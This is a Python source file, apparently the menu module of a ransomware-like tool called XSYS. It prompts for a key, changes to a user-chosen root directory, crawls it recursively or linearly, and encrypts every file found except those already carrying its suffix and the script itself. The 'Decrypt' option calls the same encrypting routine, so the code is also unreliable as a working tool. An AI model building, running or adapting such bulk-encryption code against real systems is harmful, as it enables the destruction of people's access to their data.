#!/usr/bin/env python
__author__ = "T0x1cEnv31ope"
import os
import sys
import platform
from src.main.xsys.core.XSYS import XSYS


class Menu(XSYS, object):
    """
        [Description]
        __init__
        - Construct a Menu Object
    """
    def __init__(self):
        super(Menu, self).__init__()
        self.init()

    """
        [Description]
        init
        - This method responsible of the 
        main logic of this program, it will
        engage if user input given by a console
        and operate according to the choices given. 
    """
    def init(self):
        self.clear_console()
        self.show_first_menu()
        while self.get_flag:
            main_choice = input('\n[?] Which operation would you like to do...? \
                                   \n\tD -> Decrypt \
                                   \n\tE -> Encrypt\n[$] ')

            if len(main_choice).__eq__(0):
                self.clear_console()
                print('[!] Cannot be empty, choose D | E')
                continue
            elif len(main_choice) > 1:
                main_choice = main_choice[:len(main_choice)-len(main_choice)+1]
            hex_m_choice = hex(ord(main_choice.lower()))
            #check key choice
            key_choice = input('[!] Would you like to generate a random 16-byte encryption key?\n[Y/n] ')
            if len(key_choice) > 1:
                key_choice = key_choice[:len(key_choice) - len(key_choice) + 1]
            # check the choice
            if key_choice.lower().__eq__('y'):
                self.set_hash_key = None
                print('[HASH KEY : {0}]'.format(self.hashkey))
            elif key_choice.lower().__eq__('n'):
                key_input = input('[$] insert a sixteen byte phrase!\n[Exp.] "sixteen byte key"\n[>] ')
                if not len(key_input).__eq__(16):
                    print('[!] Phrase must be 16 byte long!')
                    break
                else:
                    self.set_hash_key(key_input)
                    print('[HASH KEY : {0}]'.format(self.get_hash_key))
                continue
            else:
                print('\n'.format(key_choice))
                self.clear_console()
                continue
            # hex(dec("e")) = 0x65
            if hex_m_choice.__eq__(self.get_hex_e):
                self.clear_console()
                self.input_handler(self.get_hash_key)
            # hex(dec("d")) = 0x64
            elif hex_m_choice.__eq__(self.get_hex_d):
                self.clear_console()
                self.input_handler(self.get_hash_key)
            else:
                print('[!] "{0}" is not supported choice..!'.format(hex_m_choice))
                self.clear_console()
                continue

    """
        [Description]
        input_handler
        - This method responsible to
        handle the input received by the user.
        :param -> signature_key:str - a given key to be used as encryption key 
    """
    def input_handler(self, signature_key):
        enc_choice = input('\n[?] Which search operation would you prefer? \
                                              \n\tR -> Recursive \
                                              \n\tL -> Linear\n[$] ')
        if len(enc_choice) > 1:
            enc_choice = enc_choice[:len(enc_choice) - len(enc_choice) + 1]
        hex_e_choice = hex(ord(enc_choice.lower()))
        # hex(dec("r")) = 0x72
        if hex_e_choice.__eq__(self.get_hex_r):
            print('\n[+] Current Location: {0}'.format(os.getcwd()))
            nav_choice = input('[>>] Move to a Root Dir for scan starting point\n[-] ')
            if nav_choice.__eq__(self.get_empty_str) or len(nav_choice) <= 2:
                print('[!] Cannot use this `{0}` as path, must be at least 3 chars'.format(nav_choice))
                nav_choice = input('[>>] Move to a Root Dir for scan starting point\n[-] ')
            os.chdir(nav_choice)
            print('Actual Location: {0}'.format(os.getcwd()))
            rtar_files = self.recursive_file_crawler()
            cntr = 0
            for file in rtar_files:
                cntr += 1
                # print('[{0}] {1}'.format(cntr, file))
                if os.path.basename(file).startswith(self.get_suffix):
                    print('[!] "{0}" is already encrypted'.format(file))
                elif file.__eq__(os.path.join(os.getcwd(), sys.argv[0])):
                    pass
                else:
                    self.encrypt(self.produce_sha256_key(signature_key), str.format(file))
        # hex(dec("l")) = 0x6c
        elif hex_e_choice.__eq__(self.get_hex_l):
            print('\n[+] Current Location: {0}'.format(os.getcwd()))
            nav_choice = input('[>>] Move to a Root Dir for scan starting point\n[-] ')
            if nav_choice.__eq__(self.get_empty_str) or len(nav_choice) <= 2:
                print('[!] Cannot use this `{0}` as path, \
                      must be at least 3 chars'.format(nav_choice))
                nav_choice = input('[>>] Move to a Root Dir for scan starting point\n[-] ')
            os.chdir(nav_choice)
            print('[+] Current Location: {0}'.format(os.getcwd()))
            ltar_files, res = self.linear_file_crawler()
            cntr = 0
            for file in ltar_files:
                cntr += 1
                # print('[{0}] {1}'.format(cntr, file))
                self.encrypt(self.produce_sha256_key(signature_key), str.format(file))
            print('[&] Search took {1} seconds\n[&] Found {0} files'.format(len(ltar_files), res))
        else:
            print('[!] "{0}" is not supported choice..!'.format(hex_e_choice))
            self.clear_console()

    """
         [Description]
         clear_console
         - Clear the screen according to the running OS 

         :returns -> lambda execution of os.command::clear_screen
     """
    def clear_console(self):
        p = platform.platform()
        if p.lower().startswith(self.get_win):
            print('\n[OS: {0}]'.format(p))
            win = lambda: os.system(self._CLS)
            return win()
        elif p.lower().startswith(self.get_lin):
            print('\n[OS: {0}]'.format(p))
            lin = lambda: os.system(self._CLR)
            return lin()
        else:
            print('\n[OS: {0}]'.format(p))
            drw = lambda: os.system(self._CLR)
            return drw()


if __name__ == "__main__":
    menu = Menu()
    menu.init()
